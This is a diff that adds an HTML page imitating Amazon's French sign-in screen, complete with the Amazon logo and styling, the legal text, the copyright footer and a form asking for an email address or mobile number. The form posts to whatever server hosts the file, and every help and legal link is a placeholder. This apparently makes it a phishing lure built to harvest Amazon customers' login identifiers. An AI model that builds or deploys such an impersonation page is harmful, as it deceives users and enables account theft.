@@ -1,0 +1,45 @@
+<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<title>Amazon Connexion</title>
+	<style type="text/css">body { font-family: "Amazon Ember", Arial, sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .logo-container { margin-top: 20px; margin-bottom: 20px; }
+        .auth-card { width: 350px; border: 1px solid #ddd; border-radius: 8px; padding: 20px 26px; box-sizing: border-box; }
+        h1 { font-weight: 400; font-size: 28px; margin-bottom: 10px; margin-top: 0; }
+        label { font-size: 13px; font-weight: 700; padding-bottom: 2px; display: block; }
+        input[type="text"], input[type="email"] { width: 100%; height: 31px; padding: 3px 7px; margin-bottom: 10px; border: 1px solid #a6a6a6; border-top-color: #949494; border-radius: 3px; box-sizing: border-box; outline: 0; }
+        input:focus { border-color: #e77600; box-shadow: 0 0 3px 2px rgba(228,121,17,.5); }
+        .btn-amazon { width: 100%; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; box-shadow: 0 2px 5px 0 rgba(213,217,217,.5); cursor: pointer; padding: 8px 10px; font-size: 13px; text-align: center; }
+        .btn-amazon:hover { background: #f7ca00; }
+        .legal-text { font-size: 12px; line-height: 1.5; color: #111; margin-top: 18px; }
+        .legal-text a { color: #0066c0; text-decoration: none; }
+        .legal-text a:hover { color: #c45500; text-decoration: underline; }
+        .help-link { font-size: 13px; margin-top: 22px; display: block; color: #0066c0; text-decoration: none; }
+        .help-link:hover { color: #c45500; text-decoration: underline; }
+        .business-section { margin-top: 25px; border-top: 1px solid #e7e7e7; padding-top: 20px; font-size: 13px; }
+        .footer { width: 100%; margin-top: 40px; border-top: 1px solid #eee; background: linear-gradient(to bottom,rgba(0,0,0,.03),#fff); padding-top: 20px; text-align: center; font-size: 11px; }
+        .footer-links { margin-bottom: 10px; }
+        .footer-links a { color: #0066c0; text-decoration: none; margin: 0 8px; }
+	</style>
+</head>
+<body>
+<div class="logo-container"><img alt="Amazon" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" width="103"/></div>
+
+<div class="auth-card">
+<h1>Identifiez-vous ou créez un compte</h1>
+
+<form method="POST" action=""><label for="email">Saisissez votre numéro de téléphone portable ou votre adresse e-mail</label> <input id="email" name="username" required="" type="text"/><button class="btn-amazon" type="submit">Continuer</button></form>
+
+<div class="legal-text">En continuant, vous acceptez les <a href="#">conditions d&#39;utilisation</a> et la <a href="#">déclaration de confidentialité</a> d&#39;Amazon.</div>
+<a class="help-link" href="#">► Besoin d&#39;aide ?</a>
+
+<div class="business-section"><strong>Vous achetez pour le travail ?</strong><br/>
+<a href="#" style="color: #0066c0; text-decoration: none;">Créez un compte professionnel gratuit</a></div>
+</div>
+
+<div class="footer">
+<div class="footer-links"><a href="#">Conditions d&#39;utilisation</a> <a href="#">Déclaration de confidentialité</a> <a href="#">Aide</a> <a href="#">Avis sur les cookies</a> <a href="#">Publicité ciblée sur les centres d&#39;intérêt</a></div>
+
+<div style="color: #555;">© 1996-2026, Amazon.com, Inc. ou ses affiliés</div>
+</div>
+
+
+</body></html>
